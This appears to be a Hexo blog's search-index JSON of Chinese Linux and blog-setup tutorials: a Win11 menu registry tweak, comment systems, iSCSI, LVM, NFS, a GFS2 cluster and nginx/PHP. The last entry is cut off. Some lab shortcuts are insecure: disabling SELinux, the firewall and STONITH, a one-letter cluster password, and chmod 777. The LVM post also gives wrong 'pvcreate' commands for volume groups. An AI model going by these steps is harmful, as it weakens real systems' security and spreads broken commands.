[{"title":"Win11切换Win10经典右击菜单栏","url":"/2023/07/21/classic-menu/","content":"\n相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。\n\n### 切换Win10经典右击菜单栏\n\n<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### 恢复Win11右击菜单栏\n\n既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","tags":["Windows"],"categories":["小玩意儿"]},{"title":"设置博客背景动态特效","url":"/2023/07/17/FlyLine/","content":"\n### 修改配置文件\n\n静态的博客实在是太单调了，增加一点动态的效果吧。\n\n1. 同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. 取消注释以后，创建这样的一个文件source/_data/footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* color设置的是线条的RGB值。\n* opacity设置的是类似透明度的数值。\n* count设置的是线条的数量。\n\n重新生成一下配置，就会出现效果了。","tags":["博客美化"],"categories":["博客搭建"]},{"title":"设置博客背景图片","url":"/2023/07/17/BGPic/","content":"\n### 修改NEXT的配置文件\n\n我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。\n\n1. 首先选择一张心仪的背景图片，添加到themes/next/source/images/xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。\n\n2. 然后需要打开这个开关，也就是取消style这个注释\n\n<!-- more -->\n\n```yml\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n3. 取消注释以后，创建这样的一个文件source/_data/styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```yml\nbody {\n \tbackground:url(/images/xx.jpg);\n \tbackground-repeat: no-repeat;\n    background-attachment:fixed;\n    background-position:100% 100%;\n}\n```\n\n* background:url 为图片路径，也可以直接使用链接。\n* background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕\n* background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定\n* background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。\n\n重新生成一下配置，就会出现效果了。","tags":["博客美化"],"categories":["博客搭建"]},{"title":"博客评论系统之changyan","url":"/2023/07/17/changyan-comment/","content":"\n### 搭建原因\n\n之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。\n\n### 条件准备\n\n1. 使用畅言评论，我们首先要去[畅言评论官网](https://changyan.kuaizhan.com/)注册一个账号。\n\n<!-- more -->\n\n紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。\n\n![添加站点](./changyan-comment/1.png)\n\n2. 找到ID和SECRET。\n\n注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。\n\n![添加站点](./changyan-comment/2.png)\n\n3. 修改NEXT的主题配置文件。\n\n将comment的active值修改为changyan。\n\n```yml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\n然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。\n\n```yml\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\n修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：\n\n![添加站点](./changyan-comment/3.png)\n\n4. 对评论区的功能进行更多的设置。\n\n可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。\n\n![添加站点](./changyan-comment/4.png)\n\n可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。\n\n![添加站点](./changyan-comment/5.png)\n\n还可以设置主题的样式。\n\n![添加站点](./changyan-comment/6.png)","tags":["博客评论"],"categories":["博客搭建"]},{"title":"博客评论系统之gitalk","url":"/2023/07/14/gitalk-comment/","content":"\n### 背景介绍\n\n自己一味的输出，倘若收不到别人的反馈，自己也是不会进步的，博客的质量也就只会在当前的水平停止不前，在这样的影响下，我决心要给博客打造一个评论系统，于是我花了点时间深入研究了博客的评论的系统搭建。\n\n最初，我选择的是github的gitalk。\n\n### 环境说明\n\n我的博客基于hexo，使用的是next主题，这个主题安装之后，在主题的配置文件中，默认存在几个关于评论的系统板块，我们只要针对gitalk这个板块编辑就OK。\n\n<!-- more -->\n\n### 创建仓库\n\n1. 直接在github首页创建一个仓库，用来存储博客的评论，相当于一个数据库的作用。\n\n* 首先填写一个仓库名字，下面报红是因为我已经创建过一个了。\n* 仓库描述的话选填，可写可不写。\n* 选择为public。\n* 最后点击创建仓库。\n\n![创建仓库](./gitalk-comment/1.png)\n\n2. 除了建仓库，还需要注册一个应用。[官方注册地址](https://github.com/settings/applications/new)。\n\n* Application name填写的还是一个应用程序的名字，这里我填写的和仓库的名字保持一样了，你们按照喜好来就OK。\n* Homepage URL然后填写的是你的网站域名。\n* Application description接下来又是一个描述类的信息，选填。\n* Authorization callback URL这里同样填写你网站的域名。\n* 最后注册应用程序等待完成就好。\n\n![创建应用程序](./gitalk-comment/2.png)\n\n3. 创建完成后，默认会进入应用程序，接下来要完成一个秘钥的生成。\n\n* Client ID默认会存在。这个待会还会用到。\n* 默认是不存在密钥的，要点击生成秘钥，生成之后要立刻复制下来，因为保存或者离开页面就变成图例这样了。这个待会还会用到。\n* logo可以自己设计一个，感觉蛮不错的。\n* 都设置完之后点击最下面的Update Application。\n\n![设置应用程序](./gitalk-comment/3.png)\n\n后期如果需要对应用程序进行一些修改，可以依次到github头像-->setting-->Developer Settings-->OAuth Apps进行修改。\n\n### 修改配置文件\n\n修改配置文件的部分，进入博客主目录，`vim themes/next/_config.yml`\n\n1. 首先需要把`active`的值，改为gitalk\n\n```yaml\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: gitalk\n  # Setting `true` means remembering the comment system selected by the visitor.\n  storage: true\n  # Lazyload all comment systems.\n  lazyload: false\n  # Modify texts or order for any naves, here are some examples.\n  nav:\n    #disqus:\n    #  text: Load Disqus\n    #  order: -1\n    #gitalk:\n    #  order: -2\n```\n\n2. 然后往下滑，找到gitalk的模块。\n\n  * enable的值设置为true，表示启用。\n  * github_id表示你的github的账号。\n  * repo，填写用来存储评论的仓库。\n  * client_id之前创建的ID。\n  * client_secret之前创建好的口令。\n  * admin_user这个是管理员的账户，也就是你自己的github账号。\n  * distraction_free_mode默认就好。\n  * proxy代理值，默认就好。\n  * language语言类型，别的地方我不管，在我这里必须讲中文。\n\n```yaml\ngitalk:\n  enable: true\n  github_id: lxp731 # GitHub repo owner\n  repo: hexo-comment # Repository name to store issues\n  client_id: b771bc******0002c29 # GitHub Application Client ID\n  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret\n  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues\n  distraction_free_mode: true # Facebook-like distraction free mode\n  # When the official proxy is not available, you can change it to your own proxy address\n  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address\n  # Gitalk's display language depends on user's browser or system environment\n  # If you want everyone visiting your site to see a uniform language, you can set a force language value\n  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW\n  language: zh-CN\n  ```","tags":["博客评论"],"categories":["博客搭建"]},{"title":"二进制日志与数据库复制的关系","url":"/2023/07/13/why-mysql-binlog/","content":"\n### 数据库复制的原理解读\n\n最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。\n\n这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。\n\n<!-- more -->\n\n![数据库主从复制的](./why-mysql-binlog/1.png)\n\n1. master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。\n\n2. slave会开启一个I/O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I/O连接将新事件写进自己的中继日志里去。\n\n3. SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。\n\n4. 通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制-->复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。\n\n### 额外的话\n\n在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库`show slave status \\G`的`Slave_IO_Running`和`Slave_SQL_Running`两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。","tags":["Linux"],"categories":["技术"]},{"title":"Linux多网卡引起的网络不可达","url":"/2023/07/13/modify-METRIC/","content":"\n### 现象描述\n\n这是我最经做项目遇到的一个怪现象，是这样的，我在虚拟机里装了两块网卡，第一块呢，我用来进行虚拟机之间业务的通信，所以就选择了“仅主机模式”，第二块网卡是用来连接网络yum源的，所以就是“NAT模式”。\n\n在我第二天继续做项目的时候，我发现我的虚拟机集体罢工，都不能正常的访问外网了，尝试`ping 8.8.8.8`也不可达。我查看第二块网卡的IP，查看与宿主机之间的连接，网段，网管都是没有问题的。我百思不得其解，我之后进行Google才了解到，这是和网卡的METRIC值有关系的。\n\n<!-- more -->\n\n### 问题分析\n\n“METRIC”是Linux网卡的一个参数，本意是“度量值”的意思，这个数值越大，代表这块网卡的优先级越低。而在CentOS Linux 系统中默认的“METRIC”值是按照添加的顺序进行编号的。我第一块是“仅主机模式”的网卡，默认的“METRIC”值是100，第二块后添加的“NAT模式”网卡“METRIC”是101。\n\n查看METRIC值可以用这两条命令，我个人更倾向第二条，因为显示效果很整齐：\n\n```bash\nip route\n```\n\n```bash\nroute -n\n```\n\n那么问题就找到了，当我去`ping 8.8.8.8`的时候，默认是从“METRIC”值小的网卡出去的流量，也就是仅主机的网卡，那么自然也就访问不到外网了。\n\n### 解决办法\n\n解决办法也比较简单，在一切皆文件的Linux系统中，修改的参数无非就是对配置文件的修改。在本例中我们修改网卡的配置文件`/etc/sysconfig/network-scripts/ifcfg-ens224`。只需要在里面加上一行`IPV4_ROUTE_METRIC=10`，加在哪一行无所谓，只要单词不要拼错；改成多少都无所谓，只要比另一张网卡的“METRIC”值小就OK。\n\n然后我们重启网络服务，再重新up网卡，然后再查看网卡的“METRIC”值，验证是否生效，如果一切顺利，那么现在再去`ping 8.8.8.8`应该会发现已经好使了。","tags":["Linux"],"categories":["技术"]},{"title":"Linux关于iscsi+pacemaker+CLVM+gfs的实现","url":"/2023/07/05/gfs/","content":"\n### 基本信息\n\n|||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|\n|web3|web服务器|ens224|仅主机|10.8.7.82/24|\n|web4|web服务器|ens224|仅主机|10.8.7.83/24|\n|storage1|iscsi存储服务器|ens224|仅主机|10.8.7.41/24|\n|storage2|iscsi存储服务器|ens224|仅主机|10.8.7.42/24|\n\n### 项目说明\n\n在本项目中，主要完成以下任务：\n\n1. 完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。\n\n<!-- more -->\n\n2. 建立web1和web2主机的集群关系。\n\n3. 挂载GFS文件系统。\n\n4. 配置集群资源。\n\n5. 创建CLVM。\n\n6. 挂载共享存储。\n\n### 准备环境\n\n* Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。\n\n* 虚拟机关闭SELINUX。\n\n* 虚拟机关闭防火墙。\n\n* 虚拟机关闭NetworkManager。\n\n* 编写`/etc/hosts`文件，这个可选，我是为了后期配置方便，才写这样一个文件。\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\n如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### 项目实施\n\n* 一定要按照顺序来做。\n\n* 关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看[搭建并挂载ISCSI存储服务器](https://nustarain.gitee.io/2023/07/04/ISCSI/)这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是`/dev/sdb`，storage2提供的ISCSI存储映射到web服务器上是`/dev/sdc`。\n\n* 我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。\n\n* 下载软件，两台虚拟机都需要做的\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\n这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个`hacluster`用户，后面要用，要先给他改个密码。\n\n* 集群建立免认证，在集群任意一台机器做就可以\n\n说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\n上面的命令是以web3举的例子。\n\n* 搭建集群，两台虚拟机都需要做的\n\n```bash\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 如果报错就强制执行进行覆盖\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\n一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加`--force`选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。\n\n如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。\n\n```bash\npcs cluster destroy\n```\n\n* 挂载GFS文件系统，两台虚拟机都需要做的\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\n在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。\n\n* 配置集群资源，在集群任意一台机器做就可以\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\n这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* 创建CLVM，在集群任意一台机器做就可以\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\n这里命令的具体含义如果不懂，可以看我的[关于LVM的配置](https://nustarain.gitee.io/2023/07/04/LVM/)的文章。\n\n* 挂载实现共享存储\n\n```bash\n# 格式化文件系统，在集群任意一台机器做就可以\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# 创建挂载点，两台虚拟机都需要做的\nmkdir /mnt/cluster\n# 要实现自动挂载，在集群任意一台机器做就可以\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# 给集群资源设置启动顺序\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\n最后`df`如果看到自己创建的逻辑卷`/dev/qavg/qa`，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。","tags":["Linux"],"categories":["技术"]},{"title":"关于LVM的配置","url":"/2023/07/04/LVM/","content":"\n### 概述\n\nLVM里面主要有三个名词，物理卷（PV），卷组（VG），逻辑卷（LV）。\n\n物理卷可以有很多形式，一块单独的磁盘（`/dev/sda`），一个分好的分区（`/dev/sdb2`），甚至一个文件都可以是物理卷的一种形式。\n\n单个物理卷或者多个物理卷都可以组合起来变成一个卷组，这样就把几个单独的存储空间给整合了起来，变成了一个大的存储池。\n\n如果要使用的话，我们可以从这个池子里面分出一部分来作为存储，这个存储就是逻辑卷。\n\n### 物理卷\n\n* 创建物理卷\n\n```bash\npvcreate /dev/sdb\n```\n\n<!-- more -->\n\n* 查看物理卷的详细信息\n\n```bash\npvdisplay\n```\n\n* 查看物理卷的精简信息\n\n```bash\npvs\n```\n\n### 卷组\n\n* 创建卷组\n\n```bash\npvcreate qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组。\n\n```bash\npvcreate -s 16M qavg /dev/sdb\n```\n\n利用`/dev/sdb`创建一个叫qavg的卷组，并且设置卷组里最小的逻辑存储单位为16M。\n\n* 查看卷组的详细信息\n\n```bash\nvgdisplay\n```\n\n* 查看卷组的精简信息\n\n```bash\nvgs\n```\n\n* 扩容卷组\n\n```bash\nvgextend qavg /dev/sdb2\n```\n\n将物理卷`dev/sdb2`加入卷组qavg\n\n* 删减卷组\n\n```bash\nvgreduce qavg /dev/sdb2\n```\n\n将物理卷`/dev/sdb2`从卷组qavg中删除\n\n* 删除卷组\n\n```bash\nvgremove qavg\n```\n\n* 重命名卷组\n\n```bash\nvgrename /dev/qavg1 /dev/qavg2\n```\n\n重命名卷组`/dev/qavg1`为`/dev/qavg2`。\n\n### 逻辑卷\n\n* 创建逻辑卷\n\n```bash\nlvcreate -L 200M qavg -n qa\n```\n\n利用`qavg`这个卷组创建一个叫`qa`大小为200M的逻辑卷。这里的**L选项**指定的是平常讲的磁盘的大小。\n\n```bash\nlvcreate -l 45 qavg -n qa\n```\n\n使用**l选项**是指定的逻辑的块多少，比如上面创建卷组时指定的一个块的大小是16M，这里指定45个，逻辑卷的大小就是720M\n\n* 扩容逻辑卷\n\n```bash\nlvextend -L +54 /dev/qavg/qa\n```\n\n这个是指在原来逻辑卷的基础上再增加54Mib的存储空间。但增加不能超过卷组的总容量大小。\n\n```bash\nlvextend qavg/qa /dev/sdk3\n```\n\n使用卷组里`/dev/sdk3`这个物理卷的全部空间为`qavg/qa`扩容。\n\n```bash\nlvextend -L+16m qavg/qa /dev/sda:8-9 /dev/sdb:8-9\n```\n\n使用卷组里`/dev/sda`的8-9M的空间和`/dev/sdb`的8-9M的空间为逻辑卷`qavg/qa`扩容\n\n```bash\nlvextend -l+100%FREE -r qavg/qa\n```\n\n使用卷组所有剩余的空间为`qavg/qa`扩容。\n\n* 查看逻辑卷详细信息\n\n```bash\nlvdisplay\n```\n\n* 查看逻辑卷精简信息\n\n```bash\nlvs\n```\n\n* 删除逻辑卷\n\n```bash\nlvremove qa\n```\n\n这块的命令虽然看着挺多，但是3大类都是一个逻辑。创建，查看，删除这都是一样的，无非就是扩容的命令得记一下。加油少年！","tags":["Linux"],"categories":["技术"]},{"title":"搭建并挂载ISCSI存储服务器","url":"/2023/07/04/ISCSI/","content":"\n### ISCSI服务器端\n\n比如现在ISCSI服务器端有两块硬盘，我们想把第二块硬盘（sdb）共享出去。\n\n1. 下载软件\n\n```bash\nyum install -y targetcli\n```\n\n2. 开始进行服务端的配置\n\n* 首先键入`targetcli`进入iscsi配置模式\n\n```bash\ntargetcli\n```\n\n<!-- more -->\n\n* 然后先创建一个后端存储\n\n```bash\ncd /backstores/block/\ncreate disk1 /dev/sdb\n```\n\n`disk1`代表起的一个名字，`/dev/sdb`是真实机器里存在的设备。\n\n* 创建可以识别的iqn设备\n\n```bash\ncd /iscsi/\ncreate iqn.2023-07.com.liuxp:san1\n```\n\n`iqn.2023-07.com.liuxp:san1`是可以被客户端的识别到的名字，客户端可以凭这个名字挂载到自身。\n\n* 创建iqn里的卷，刚刚创建的iqn只是一个名字，里面现在还没有存储设备，现在要在里面添加存储设备\n\n```bash\ncd iqn.2023-07.com.liuxp:san1/tpg1/luns/\ncreate /backstores/block/disk1\n```\n\n* 创建好iqn里的存储设备，然后就该设置iqn设备的访问权限了\n\n```bash\ncd ../acls/\ncreate iqn.2023-07.com.liuxp:web1\n```\n\n不要奇怪这个新创建的iqn是一个识别秘钥，客户端需要拿着这个秘钥来连接，以此来达到访问控制的目的。具体的操作是将这个`acls`里的`iqn`名字复制下来待会粘贴到客户端的一个配置文件里面。\n\n* 设置门户，这个我也解释不清楚含义，就是想在这里介绍一下删除命令，还有如果要设置的话，要设置为本机的IP\n\n```bash\ncd ../portals/\ndelele 0.0.0.0 3260\ncreate 10.8.7.41 3260\n```\n\n* 到这里就设置完成了键入`exit`退出设置。\n\n* 启动服务\n\n```bash\nsystemctl start target.service \n```\n\n### ISCSI客户端\n\n1. 下载软件\n\n```bash\nyum install -y iscsi-initiator-utils\n```\n\n2. 修改配置文件`/etc/iscsi/initiatorname.iscsi`\n\n```bash\nInitiatorName=iqn.2023-07.com.liuxp:web1\n```\n\n把这里的iqn设置为服务器端`acls`里的那个iqn，上面也说过一嘴。\n\n3. 然后开始扫描iqn设备\n\n```bash\niscsiadm -m discovery -t st -p 10.8.7.41\n```\n\n**p选项**后面接上服务器端的IP地址。\n\n4. 扫描到之后接着开始最后一步挂载\n\n```bash\niscsiadm -m node -T iqn.2023-07.com.liuxp:san1 -p 10.8.7.41 -l\n```\n\n**T选项**后面接上面刚刚扫描出来的iqn设备，**p选项**接ISCSI服务器的IP\n\n5. 可以通过下面的命令查看挂载成功的会话信息\n\n```bash\niscsiadm -m session\n```\n\n6. 如果需要的话可以了解一下，卸载本地已挂载的全部ISCSI存储设备\n\n```bash\niscsiadm -m node --logoutall=all\n```\n\n7. 写在最后的话\n\n如果遇到第4步无法挂载，一是要检查配置文件的iqn是否和服务器acls设置一致，二是要检查IP地址时候填写正确，客户端如果检查都无误了，因为之前会产生缓存，一般后面几次也不会成功，可以通过删除`/var/lib/iscsi/nodes`及`/var/lib/iscsi/send_targets`下的内容之后再次尝试。如果还是不行，就只能重启了。如果对服务器端进行了修改，一定要记得重启服务生效。","tags":["Linux"],"categories":["技术"]},{"title":"NFS挂载到服务器","url":"/2023/07/04/nfs/","content":"\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|主机名|身份|网络接口|连接模式|IP地址|软件|\n|NFS|存储服务器|ens224|仅主机|10.8.7.40/24|nfs-utils|\n|Web1|Web服务器|ens224|仅主机|10.8.7.80/24|nginx、nfs-utils|\n\n### NFS服务器部分\n\n1. 下载软件\n\n```bash\nyum install -y nfs-utils\n```\n\n<!-- more -->\n\n2. 编辑配置文件`vim /etc/exports`\n\n```bash\n/www 10.8.7.80(rw)\n```\n\n这个配置文件代表将自己主机下的`/www`目录共享给10.8.7.80主机，并且赋予读和写的权限。\n\n3. 要记得把要共享出去的目录赋予相应的权限，要不然访问起来会有问题,在这里我直接给了`777`，不要学我，只是告诉你们如果后期NGINX访问出现404，应该要想到回到这里思考权限的问题。\n\n```bash\nchmod 777 /www\n```\n\n4. 启动服务\n\n```bash\nsystemctl start nfs-server\n```\n\n5. 导出配置文件\n\n```bash\nexportfs -rv\n```\n\n### Web服务器的部分\n\n1. 创建挂载点\n\n```bash\nmkdir /www\n```\n\n2. 编辑`/etc/fstab`实现永久挂载\n\n```bash\n10.8.7.40:/www  /www    nfs     rw,sync 0 0\n```\n\n3. 挂载共享目录\n\n```bash\nsystemctl daemon-reload\nmount -a\n```","tags":["Linux"],"categories":["技术"]},{"title":"NGINX整合PHP","url":"/2023/07/04/nginx-union-php/","content":"\n### NGINX整合PHP\n\n这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。\n\n<!-- more -->\n\n具体操作如下：\n\n* 打开NGINX的配置文件,添加这一段。\n\n```bash\n        location ~ \\.php$ {\n            root   /web;\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME $document_root$fastcgi_script_name;\n            include         fastcgi_params;\n        }\n```\n\n补一张图片显示要插入的位置。\n\n![](./nginx-union-php/1.png)\n\n然后就完成了NGINX和PHP的联动。","tags":["Linux"]},{"title":"源码安装PHP","url":"/2023/07/04/php/","content":"\n### 安装PHP\n\n无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用`php-fpm start`启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。\n\n<!-- more -->\n\n[PHP源码包下载链接](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\n提取码：ba1u\n\n* 解压源码包\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\n这里分了两条依赖命令，如果是按照之前我写的[源码安装NGINX的博客](https://nustarain.gitee.io/2023/07/04/nginx/)已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* 再执行两步安装完成\n\n```bash\nmake  # 这里make的时间会相对长一点\nmake install\n```\n\n* 拷贝一份配置文件\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* 拷贝启动文件\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* 为启动文件添加启动权限\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* 再拷贝一份到系统的命令里面\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\n然后就可以使用简单的命令对PHP进行管理\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* 启动之后可以检查一下监听端口\n\n```bash\nlsof -i:9000\n```","tags":["Linux"],"categories":["技术"]},{"title":"源码安装NGINX","url":"/2023/07/04/nginx/","content":"\n### 